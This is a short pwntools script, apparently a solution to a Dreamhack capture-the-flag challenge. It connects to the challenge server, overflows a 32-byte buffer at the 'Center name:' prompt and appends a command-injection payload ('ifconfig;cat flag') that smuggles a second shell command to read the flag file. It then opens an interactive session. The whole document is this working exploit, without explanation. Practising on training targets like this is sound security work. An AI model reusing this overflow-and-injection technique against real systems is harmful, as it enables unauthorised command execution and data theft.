from pwn import *

p = remote('host1.dreamhack.games', 17197)

payload = b'a' * 32
payload += b'ifconfig'
payload += b';'
payload += b'cat flag'

p.sendafter(b'Center name: ', payload)
# data = p.recv(1024)
# print(data)
p.interactive()
